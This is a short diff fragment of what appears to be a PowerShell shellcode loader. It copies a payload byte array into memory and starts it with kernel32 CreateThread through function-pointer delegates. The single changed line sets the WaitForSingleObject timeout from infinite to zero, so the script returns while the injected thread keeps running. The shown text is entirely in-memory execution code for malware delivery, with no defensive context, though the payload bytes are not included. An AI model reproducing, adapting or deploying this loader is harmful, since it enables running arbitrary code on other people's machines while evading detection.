@@ -26,7 +26,7 @@ $var9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
 [System.Runtime.InteropServices.Marshal]::Copy($var8, 0, $var9, $var8.length)
 
 $var10 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll CreateThread), (var4 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$var9,[IntPtr]::Zero,0,[IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll WaitForSingleObject), (var4 @([IntPtr], [Int32]))).Invoke($var10,0xffffffff) | Out-Null
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll WaitForSingleObject), (var4 @([IntPtr], [Int32]))).Invoke($var10,0x0) | Out-Null
 '@
 
 If ([IntPtr]::size -eq 8) {
